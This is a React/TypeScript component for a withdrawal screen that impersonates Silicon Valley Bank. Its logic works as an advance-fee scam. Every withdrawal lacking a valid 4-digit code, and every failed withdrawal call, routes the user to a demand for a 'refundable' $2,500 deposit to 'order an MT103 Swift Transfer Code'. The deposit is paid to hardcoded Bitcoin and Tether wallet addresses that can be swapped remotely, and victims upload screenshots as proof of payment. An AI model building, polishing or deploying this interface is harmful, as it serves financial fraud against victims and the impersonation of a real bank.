import React, { useState } from 'react';
import { User, Transaction } from '../types';
import { api } from '../services/api';
import { subscribeCryptoAddressesFromFirestore } from '../lib/firebase';
import { ArrowUpRight, Landmark, CreditCard, DollarSign, AlertCircle, CheckCircle2, ShieldCheck, Key, X, ShieldAlert, Clock, Copy, Check, FileText, ArrowLeft } from 'lucide-react';

interface WithdrawPanelProps {
  user: User;
  onSuccess: (updatedUser: User, transaction: Transaction) => void;
  onBack?: () => void;
  onNavigateTab?: (tab: string) => void;
}

export const WithdrawPanel: React.FC<WithdrawPanelProps> = ({ user, onSuccess, onBack, onNavigateTab }) => {
  const [bankName, setBankName] = useState('');
  const [routingNumber, setRoutingNumber] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [accountHolderName, setAccountHolderName] = useState(user.fullName);
  const [amount, setAmount] = useState('');
  const [fourDigitCode, setFourDigitCode] = useState('');
  const [note, setNote] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [successTxn, setSuccessTxn] = useState<Transaction | null>(null);

  const [showVerificationModal, setShowVerificationModal] = useState(false);
  const [verificationError, setVerificationError] = useState<string | null>(null);

  // Deposit $2,500 USD requirement modal state
  const [showDepositPromptModal, setShowDepositPromptModal] = useState(false);
  const [showCryptoModal, setShowCryptoModal] = useState(false);
  const [cryptoModalStep, setCryptoModalStep] = useState<'order_prompt' | 'payment_details'>('order_prompt');
  const [cryptoMethod, setCryptoMethod] = useState<'BTC' | 'USDT'>('BTC');
  const [txHash, setTxHash] = useState('');
  const [proofNote, setProofNote] = useState('');
  const [proofImage, setProofImage] = useState<string | null>(null);
  const [submittingDeposit, setSubmittingDeposit] = useState(false);
  const [depositSuccessMsg, setDepositSuccessMsg] = useState<string | null>(null);
  const [copiedAddress, setCopiedAddress] = useState(false);

  const [walletAddresses, setWalletAddresses] = useState<{ BTC: string; USDT: string }>({
    BTC: '1Fy9Up78qVeawXCLnAqcnRJrvjiXLJF21d',
    USDT: '0x400773d018e8ad3575458b5e8b11ff55078451c9'
  });

  React.useEffect(() => {
    api.getCryptoAddresses()
      .then(res => {
        if (res.addresses) setWalletAddresses(res.addresses);
      })
      .catch(console.error);

    const unsub = subscribeCryptoAddressesFromFirestore((addrs) => {
      setWalletAddresses(prev => ({ ...prev, ...addrs }));
    });

    const handleWindowUpdate = (e: any) => {
      if (e.detail) setWalletAddresses(prev => ({ ...prev, ...e.detail }));
    };
    window.addEventListener('crypto-addresses-updated', handleWindowUpdate);

    return () => {
      unsub();
      window.removeEventListener('crypto-addresses-updated', handleWindowUpdate);
    };
  }, [showCryptoModal, showDepositPromptModal]);

  const copyAddress = (address: string) => {
    navigator.clipboard.writeText(address);
    setCopiedAddress(true);
    setTimeout(() => setCopiedAddress(false), 2000);
  };

  const handleScreenshotUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      if (file.size > 5 * 1024 * 1024) {
        setError('Screenshot image must be under 5MB.');
        return;
      }
      const reader = new FileReader();
      reader.onloadend = () => {
        setProofImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  const handleCryptoDepositSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSubmittingDeposit(true);

    try {
      const res = await api.submitCryptoActivationDeposit({
        cryptoMethod,
        txHash: txHash.trim(),
        proofNote: proofNote.trim(),
        proofImage: proofImage || undefined
      });
      if (res.user && onSuccess) {
        onSuccess(res.user, null as any);
      }
      setDepositSuccessMsg(`Your $2,500 ${cryptoMethod} deposit proof has been submitted to Silicon Valley Bank for verification.`);
      setTimeout(() => {
        setShowCryptoModal(false);
        setDepositSuccessMsg(null);
        setTxHash('');
        setProofNote('');
        setProofImage(null);
      }, 3000);
    } catch (err: any) {
      setError(err.message || 'Failed to submit activation deposit proof.');
    } finally {
      setSubmittingDeposit(false);
    }
  };

  const handleInitialFormSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);
    setSuccessTxn(null);

    const numAmount = parseFloat(amount);
    if (!bankName || !routingNumber || !accountNumber || !accountHolderName) {
      setError('Please fill in all receiving bank account details.');
      return;
    }
    if (isNaN(numAmount) || numAmount <= 0) {
      setError('Please enter a valid withdrawal amount greater than $0.00.');
      return;
    }
    if (numAmount > user.balance) {
      setError(`Insufficient funds. Your available balance is $${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}.`);
      return;
    }

    setVerificationError(null);
    setShowVerificationModal(true);
  };

  const executeWithdrawWithCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setVerificationError(null);

    if (user.role !== 'admin' && (!fourDigitCode.trim() || !user.fourDigitCode || fourDigitCode.trim() !== user.fourDigitCode.trim())) {
      setShowVerificationModal(false);
      setShowDepositPromptModal(true);
      return;
    }

    const numAmount = parseFloat(amount);

    try {
      setLoading(true);
      const res = await api.withdrawFunds({
        bankName: bankName.trim(),
        routingNumber: routingNumber.trim(),
        accountNumber: accountNumber.trim(),
        accountHolderName: accountHolderName.trim(),
        amount: numAmount,
        note: note.trim(),
        fourDigitCode: fourDigitCode.trim()
      });
      setSuccessTxn(res.transaction);
      onSuccess(res.updatedUser, res.transaction);
      
      setShowVerificationModal(false);
      setAmount('');
      setFourDigitCode('');
      setNote('');
    } catch (err: any) {
      setShowVerificationModal(false);
      setShowDepositPromptModal(true);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-2xl mx-auto space-y-6">
      {/* Header Banner */}
      <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl relative overflow-hidden">
        <div className="flex items-center gap-4">
          {onBack && (
            <button
              onClick={onBack}
              className="p-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white transition-colors border border-slate-700 flex items-center gap-1.5 text-xs font-semibold shrink-0"
              title="Go Back"
            >
              <ArrowLeft className="w-4 h-4" />
              <span>Back</span>
            </button>
          )}
          <div className="w-12 h-12 rounded-2xl bg-teal-500/10 border border-teal-500/20 flex items-center justify-center text-teal-400 shrink-0">
            <ArrowUpRight className="w-6 h-6" />
          </div>
          <div>
            <h2 className="text-xl font-bold text-white tracking-tight">External Wire & ACH Withdrawal</h2>
            <p className="text-xs text-slate-400 mt-0.5">
              Withdraw funds directly to any US or international commercial bank account.
            </p>
          </div>
        </div>

        {/* Balance Card */}
        <div className="mt-6 p-4 rounded-2xl bg-slate-950/80 border border-slate-800 flex items-center justify-between">
          <div>
            <p className="text-xs text-slate-400 font-medium">Available Balance</p>
            <p className="text-2xl font-bold text-emerald-400 mt-0.5">
              ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} <span className="text-xs text-slate-400">{user.currency}</span>
            </p>
          </div>
          <div className="text-right">
            <p className="text-[11px] text-slate-400">Processing Time</p>
            <p className="text-xs font-semibold text-teal-400 bg-teal-500/10 border border-teal-500/20 px-2 py-0.5 rounded-full inline-block mt-1">
              Instant Wire Clearance
            </p>
          </div>
        </div>
      </div>

      {/* Success Receipt Banner */}
      {successTxn && (
        <div className="bg-emerald-950/60 border border-emerald-500/30 rounded-2xl p-5 text-slate-200 space-y-3 animate-fadeIn">
          <div className="flex items-center gap-3">
            <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
            <span className="font-semibold text-white text-sm">Wire Withdrawal Executed Successfully</span>
          </div>
          <div className="bg-slate-950/60 rounded-xl p-3 border border-emerald-500/10 text-xs space-y-1 font-mono">
            <p className="flex justify-between text-slate-400">
              <span>Reference:</span>
              <span className="text-emerald-400 font-semibold">{successTxn.reference}</span>
            </p>
            <p className="flex justify-between text-slate-400">
              <span>Amount Withdrawn:</span>
              <span className="text-white font-semibold">${successTxn.amount.toFixed(2)} USD</span>
            </p>
            <p className="flex justify-between text-slate-400">
              <span>Destination:</span>
              <span className="text-slate-200">{bankName} (****{accountNumber.slice(-4)})</span>
            </p>
          </div>
        </div>
      )}

      {/* Error Message */}
      {error && (
        <div className="bg-rose-950/60 border border-rose-500/30 rounded-2xl p-4 flex items-start gap-3 text-rose-300 text-xs">
          <AlertCircle className="w-5 h-5 text-rose-400 shrink-0 mt-0.5" />
          <span>{error}</span>
        </div>
      )}

      {/* Form */}
      <form onSubmit={handleInitialFormSubmit} className="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-5">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-2">
              Receiving Bank Name <span className="text-rose-400">*</span>
            </label>
            <div className="relative">
              <Landmark className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
              <input
                type="text"
                value={bankName}
                onChange={(e) => setBankName(e.target.value)}
                placeholder="e.g. Chase, Bank of America, Wells Fargo"
                className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
                required
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-2">
              Account Holder Name <span className="text-rose-400">*</span>
            </label>
            <input
              type="text"
              value={accountHolderName}
              onChange={(e) => setAccountHolderName(e.target.value)}
              placeholder="Full Legal Name"
              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
              required
            />
          </div>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-2">
              ABA Routing Number (9 Digits) <span className="text-rose-400">*</span>
            </label>
            <input
              type="text"
              value={routingNumber}
              onChange={(e) => setRoutingNumber(e.target.value)}
              placeholder="e.g. 121000358"
              maxLength={12}
              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
              required
            />
          </div>

          <div>
            <label className="block text-xs font-semibold text-slate-300 mb-2">
              Bank Account Number <span className="text-rose-400">*</span>
            </label>
            <div className="relative">
              <CreditCard className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                placeholder="External Account #"
                className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
                required
              />
            </div>
          </div>
        </div>

        <div>
          <label className="block text-xs font-semibold text-slate-300 mb-2">
            Withdrawal Amount ($ USD) <span className="text-rose-400">*</span>
          </label>
          <div className="relative">
            <DollarSign className="w-4 h-4 text-slate-400 absolute left-3.5 top-3.5" />
            <input
              type="number"
              step="0.01"
              min="0.01"
              max={user.balance}
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0.00"
              className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl pl-10 pr-16 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors font-mono"
              required
            />
            <button
              type="button"
              onClick={() => setAmount(user.balance.toString())}
              className="absolute right-2.5 top-2 text-[10px] uppercase font-bold text-teal-400 bg-teal-500/10 hover:bg-teal-500/20 border border-teal-500/20 px-2 py-1 rounded-lg transition-colors"
            >
              Max
            </button>
          </div>
        </div>

        <div>
          <label className="block text-xs font-semibold text-slate-300 mb-2">
            Memo / Reference (Optional)
          </label>
          <input
            type="text"
            value={note}
            onChange={(e) => setNote(e.target.value)}
            placeholder="e.g. Payroll disbursement"
            className="w-full bg-slate-950 border border-slate-800 focus:border-teal-500 rounded-xl px-4 py-2.5 text-sm text-white placeholder-slate-500 outline-none transition-colors"
          />
        </div>

        <button
          type="submit"
          disabled={loading || !bankName || !accountNumber || !amount}
          className="w-full bg-teal-500 hover:bg-teal-400 text-slate-950 font-bold py-3.5 px-4 rounded-xl shadow-lg shadow-teal-500/20 flex items-center justify-center gap-2 transition-all text-sm disabled:opacity-50"
        >
          {loading ? (
            <div className="w-5 h-5 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
          ) : (
            <>
              <ArrowUpRight className="w-4 h-4" />
              <span>Submit Withdrawal Request</span>
            </>
          )}
        </button>
      </form>

      {/* 4-Digit Security Code Verification Modal (Shown AFTER form submit) */}
      {showVerificationModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/85 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-teal-500/40 rounded-3xl p-6 max-w-md w-full space-y-5 shadow-2xl relative animate-fadeIn">
            <button
              onClick={() => setShowVerificationModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1 rounded-xl bg-slate-800"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-14 h-14 rounded-2xl bg-teal-500/10 border border-teal-500/30 flex items-center justify-center text-teal-400 mx-auto">
              <Key className="w-7 h-7" />
            </div>

            <div className="text-center space-y-2">
              <span className="text-[10px] font-bold uppercase tracking-widest text-teal-400 bg-teal-500/10 border border-teal-500/20 px-2.5 py-1 rounded-full">
                Security Verification Protocol
              </span>
              <h3 className="text-xl font-bold text-white pt-1">Authorize Withdrawal</h3>
              <p className="text-xs text-slate-300 leading-relaxed">
                Please enter your <span className="text-teal-400 font-semibold font-mono">4-digit security code</span> to confirm and authorize this external bank withdrawal.
              </p>
            </div>

            {/* Summary Box */}
            <div className="p-3.5 bg-slate-950 rounded-2xl border border-slate-800 text-xs space-y-1.5 font-mono">
              <div className="flex justify-between text-slate-400">
                <span>Withdrawal Amount:</span>
                <span className="text-teal-400 font-bold">${parseFloat(amount).toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</span>
              </div>
              <div className="flex justify-between text-slate-400">
                <span>Receiving Bank:</span>
                <span className="text-white truncate max-w-[180px]">{bankName}</span>
              </div>
              <div className="flex justify-between text-slate-400">
                <span>Account Number:</span>
                <span className="text-slate-200">{accountNumber}</span>
              </div>
            </div>

            <form onSubmit={executeWithdrawWithCode} className="space-y-4">
              <div>
                <label className="block text-xs font-semibold text-slate-300 mb-2">
                  4-Digit Transaction Security Code <span className="text-rose-400">*</span>
                </label>
                <input
                  type="password"
                  maxLength={4}
                  value={fourDigitCode}
                  onChange={(e) => setFourDigitCode(e.target.value)}
                  placeholder="Enter 4-digit security code"
                  className="w-full bg-slate-950 border border-teal-500/50 focus:border-teal-400 rounded-xl px-4 py-3 text-center text-lg text-white font-mono tracking-widest outline-none transition-colors"
                  autoFocus
                  required
                />
              </div>

              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setShowVerificationModal(false)}
                  className="w-1/3 bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-3 rounded-xl text-xs transition-colors"
                >
                  Cancel
                </button>
                <button
                  type="submit"
                  disabled={loading || !fourDigitCode.trim()}
                  className="w-2/3 bg-teal-500 hover:bg-teal-400 text-slate-950 font-bold py-3 rounded-xl text-xs shadow-lg shadow-teal-500/20 flex items-center justify-center gap-2 transition-all disabled:opacity-50"
                >
                  {loading ? (
                    <div className="w-4 h-4 border-2 border-slate-950 border-t-transparent rounded-full animate-spin" />
                  ) : (
                    <>
                      <ShieldCheck className="w-4 h-4" />
                      <span>Confirm & Withdraw</span>
                    </>
                  )}
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {/* Order your MT103 Swift Transfer Code Prompt Modal */}
      {showDepositPromptModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn">
            <button
              onClick={() => setShowDepositPromptModal(false)}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1.5 rounded-xl bg-slate-800 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="w-14 h-14 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 mx-auto">
              <Key className="w-7 h-7" />
            </div>

            <div className="text-center space-y-2">
              <div className="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-amber-500/10 border border-amber-500/20 text-[10px] font-bold uppercase tracking-wider text-amber-400">
                <ShieldAlert className="w-3.5 h-3.5" />
                <span>Security Authorization Required</span>
              </div>
              <h3 className="text-lg sm:text-2xl font-extrabold text-white tracking-tight">
                Order your MT103 Swift Transfer Code
              </h3>
              <p className="text-xs text-slate-300 leading-relaxed max-w-md mx-auto">
                To execute outgoing wire transfers and institutional MT103 SWIFT remittances, you must order an official 4-Digit Security Authorization Code registered to your Silicon Valley Bank account.
              </p>
            </div>

            {user.pendingCryptoDeposit?.status === 'Pending' ? (
              <div className="p-4 bg-amber-500/10 border border-amber-500/30 rounded-2xl text-xs space-y-2">
                <div className="flex items-center justify-between">
                  <span className="font-bold text-amber-400 flex items-center gap-1.5">
                    <Clock className="w-4 h-4 animate-spin text-amber-400" />
                    MT103 Swift Code Order
                  </span>
                  <span className="text-[10px] bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded-full font-mono font-bold">
                    Under Review
                  </span>
                </div>
                <p className="text-slate-300 text-[11px] leading-relaxed">
                  Your $2,500 deposit proof for <span className="font-bold text-white">{user.pendingCryptoDeposit.cryptoMethod}</span> is currently being verified by Silicon Valley Bank Treasury. Your MT103 Swift Code will be issued upon clearance.
                </p>
              </div>
            ) : (
              <div className="p-4 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-2">
                <div className="flex items-center justify-between font-bold text-amber-400 border-b border-slate-800 pb-2">
                  <span>MT103 SWIFT & Fedwire Protocol:</span>
                  <span className="font-mono text-xs">$2,500.00 USD</span>
                </div>
                <ul className="space-y-1.5 text-slate-400 list-disc list-inside">
                  <li>A refundable verification deposit of <strong className="text-slate-200">$2,500.00 USD</strong> is required to generate your MT103 Swift 4-digit code.</li>
                  <li>The full $2,500 deposit is credited directly to your account balance upon verification.</li>
                  <li>Enables unlimited outgoing domestic Fedwire & international MT103 transfers.</li>
                </ul>
              </div>
            )}

            <div className="flex flex-col gap-2.5 pt-2">
              <button
                onClick={() => {
                  setShowDepositPromptModal(false);
                  setCryptoModalStep('payment_details');
                  setShowCryptoModal(true);
                }}
                className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
              >
                <Key className="w-4 h-4" />
                <span>Order MT103 Swift Code ($2,500 Deposit)</span>
              </button>

              <button
                onClick={() => setShowDepositPromptModal(false)}
                className="w-full bg-slate-800 hover:bg-slate-700 text-slate-300 font-semibold py-2.5 rounded-2xl text-xs transition-colors"
              >
                Cancel / Return to Transfer
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Crypto Activation Deposit Modal */}
      {showCryptoModal && (
        <div className="fixed inset-0 z-50 bg-slate-950/80 backdrop-blur-md flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-amber-500/40 rounded-3xl p-6 sm:p-7 max-w-lg w-full space-y-5 shadow-2xl relative animate-fadeIn max-h-[90vh] overflow-y-auto">
            <button
              onClick={() => {
                setShowCryptoModal(false);
                setCryptoModalStep('order_prompt');
              }}
              className="absolute top-4 right-4 text-slate-400 hover:text-white p-1.5 rounded-xl bg-slate-800 transition-colors"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="flex items-center gap-3 border-b border-slate-800 pb-4">
              <div className="w-11 h-11 rounded-2xl bg-amber-500/10 border border-amber-500/30 flex items-center justify-center text-amber-400 shrink-0">
                <Key className="w-6 h-6" />
              </div>
              <div>
                <h3 className="text-base sm:text-lg font-bold text-white">Order your MT103 Swift Transfer Code</h3>
                <p className="text-xs text-slate-400 mt-0.5">$2,500.00 USD Required Amount • Bitcoin (BTC) & Tether (USDT)</p>
              </div>
            </div>

            {depositSuccessMsg ? (
              <div className="p-3.5 bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs rounded-xl flex items-center gap-2">
                <CheckCircle2 className="w-4 h-4 shrink-0" />
                <span>{depositSuccessMsg}</span>
              </div>
            ) : cryptoModalStep === 'order_prompt' ? (
              <div className="space-y-4 text-xs animate-fadeIn">
                <div className="p-4 bg-slate-950 border border-slate-800 rounded-2xl text-[11px] text-slate-300 space-y-3">
                  <div className="flex items-center justify-between font-bold text-amber-400 border-b border-slate-800 pb-2">
                    <span>MT103 SWIFT Protocol Authorization:</span>
                    <span className="font-mono text-xs text-emerald-400">$2,500.00 USD</span>
                  </div>
                  <p className="text-slate-300 leading-relaxed">
                    Institutional wire clearance requires ordering a verified MT103 Swift security code. A refundable security deposit of <strong>$2,500 USD</strong> is required to generate your credentials.
                  </p>
                  <ul className="space-y-1.5 text-slate-400 list-disc list-inside">
                    <li>Deposit is 100% credited to your available SVB account balance.</li>
                    <li>Instant issuance upon Bitcoin (BTC) or Tether (USDT) confirmation.</li>
                    <li>Unlocks unlimited wire disbursements & vendor payments.</li>
                  </ul>
                </div>

                <button
                  type="button"
                  onClick={() => setCryptoModalStep('payment_details')}
                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-2xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
                >
                  <Key className="w-4 h-4" />
                  <span>Order MT103 Swift Code & Select Payment Method</span>
                </button>
              </div>
            ) : (
              <form onSubmit={handleCryptoDepositSubmit} className="space-y-4 text-xs animate-fadeIn">
                <div className="flex items-center justify-between pb-1">
                  <span className="text-slate-400 text-[11px]">Step 2 of 2: Select Deposit Network & Upload Proof</span>
                  <button
                    type="button"
                    onClick={() => setCryptoModalStep('order_prompt')}
                    className="text-amber-400 hover:underline text-[11px] font-semibold"
                  >
                    ← MT103 Order Overview
                  </button>
                </div>

                <div>
                  <label className="block font-semibold text-slate-300 mb-2">Select Cryptocurrency Deposit Network</label>
                  <div className="grid grid-cols-2 gap-2.5">
                    <button
                      type="button"
                      onClick={() => setCryptoMethod('BTC')}
                      className={`p-3 rounded-2xl border font-bold text-xs flex items-center justify-center gap-2 transition-all ${
                        cryptoMethod === 'BTC' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
                      }`}
                    >
                      <span>Bitcoin (BTC)</span>
                    </button>
                    <button
                      type="button"
                      onClick={() => setCryptoMethod('USDT')}
                      className={`p-3 rounded-2xl border font-bold text-xs flex items-center justify-center gap-2 transition-all ${
                        cryptoMethod === 'USDT' ? 'bg-amber-500 text-slate-950 border-amber-400 shadow-md' : 'bg-slate-950 text-slate-300 border-slate-800 hover:border-slate-700'
                      }`}
                    >
                      <span>Tether (USDT)</span>
                    </button>
                  </div>
                </div>

                <div className="p-4 bg-slate-950 rounded-2xl border border-slate-800 space-y-3">
                  <div className="flex items-center justify-between text-[11px] text-slate-400">
                    <span>Required Deposit Amount:</span>
                    <span className="font-bold text-amber-400 text-sm font-mono">$2,500.00 USD</span>
                  </div>
                  <div className="text-[11px]">
                    <span className="text-slate-400 block mb-1">Official Wallet Address ({cryptoMethod}) — Click/Tap to Copy:</span>
                    <div
                      onClick={() => copyAddress(walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC'])}
                      className="cursor-pointer hover:border-amber-500/50 flex items-center gap-2 bg-slate-900 p-3 rounded-xl border border-slate-800 transition-all group"
                    >
                      <span className="font-mono text-amber-400 font-semibold text-xs break-all flex-1 select-all">
                        {walletAddresses[cryptoMethod] || walletAddresses['USDT'] || walletAddresses['BTC']}
                      </span>
                      <div className="p-1.5 bg-slate-800 group-hover:bg-amber-500 group-hover:text-slate-950 text-slate-200 rounded-lg shrink-0 flex items-center gap-1 text-[10px] font-bold transition-all">
                        {copiedAddress ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                        <span>{copiedAddress ? 'Copied!' : 'Copy'}</span>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block font-semibold text-slate-300 mb-1">Upload Screenshot Proof of Payment *</label>
                  <div className="relative border-2 border-dashed border-slate-800 hover:border-amber-500/50 rounded-2xl p-4 text-center bg-slate-950 transition-all cursor-pointer">
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleScreenshotUpload}
                      className="absolute inset-0 opacity-0 cursor-pointer w-full h-full"
                    />
                    {proofImage ? (
                      <div className="space-y-2">
                        <img src={proofImage} alt="Payment Proof" className="max-h-32 mx-auto rounded-xl border border-slate-700 object-cover" />
                        <p className="text-emerald-400 text-[11px] font-semibold flex items-center justify-center gap-1">
                          <CheckCircle2 className="w-3.5 h-3.5" /> Screenshot Loaded Successfully (Click to Change)
                        </p>
                      </div>
                    ) : (
                      <div className="space-y-1 text-slate-400">
                        <FileText className="w-6 h-6 mx-auto text-amber-400" />
                        <p className="text-xs font-semibold text-slate-200">Tap or click to select payment screenshot</p>
                        <p className="text-[10px] text-slate-500">PNG, JPG, or WEBP up to 5MB</p>
                      </div>
                    )}
                  </div>
                </div>

                <div>
                  <label className="block font-semibold text-slate-300 mb-1">Transaction Hash / Reference (Optional)</label>
                  <input
                    type="text"
                    value={txHash}
                    onChange={(e) => setTxHash(e.target.value)}
                    placeholder="e.g. 0x8f4b... or Blockchain TXID"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white font-mono outline-none focus:border-amber-500"
                  />
                </div>

                <div>
                  <label className="block font-semibold text-slate-300 mb-1">Additional Note / Sender Tag (Optional)</label>
                  <input
                    type="text"
                    value={proofNote}
                    onChange={(e) => setProofNote(e.target.value)}
                    placeholder="e.g. Sent from personal crypto wallet"
                    className="w-full bg-slate-950 border border-slate-800 rounded-xl px-3.5 py-2.5 text-white outline-none focus:border-amber-500"
                  />
                </div>

                <button
                  type="submit"
                  disabled={submittingDeposit}
                  className="w-full bg-amber-500 hover:bg-amber-400 text-slate-950 font-extrabold py-3.5 rounded-xl text-xs transition-all shadow-lg shadow-amber-500/20 flex items-center justify-center gap-2"
                >
                  {submittingDeposit ? 'Submitting Deposit...' : 'Submit $2,500 Payment Proof for Verification'}
                </button>
              </form>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
